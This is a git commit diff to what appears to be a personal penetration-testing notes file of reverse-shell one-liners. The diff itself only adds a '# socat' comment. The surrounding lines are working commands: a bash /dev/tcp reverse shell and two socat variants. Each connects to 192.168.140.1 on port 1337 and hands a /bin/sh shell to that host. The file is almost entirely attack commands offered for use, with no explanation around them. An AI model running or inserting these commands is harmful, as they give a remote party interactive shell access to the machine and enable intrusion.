ad2170d1b8ae06ab83606429cd918580c61c2a9c
chnnn <chnnn.git@gmail.com>
2020-11-05 00:57:04 +0900

    openssl, powershell minor, misc

--- notes_gsec/pl#reverseShell.sh
+++ notes_gsec/pl#reverseShell.sh
@@ -1,4 +1,5 @@
 bash -i >& /dev/tcp/192.168.140.1/1337 0>&1
 
+# socat
 socat tcp-connect:192.168.140.1:1337 exec:/bin/sh,stderr,pty
 socat tcp-connect:192.168.140.1:1337 exec:/bin/sh,stderr,pty,setsid,sigint,sane
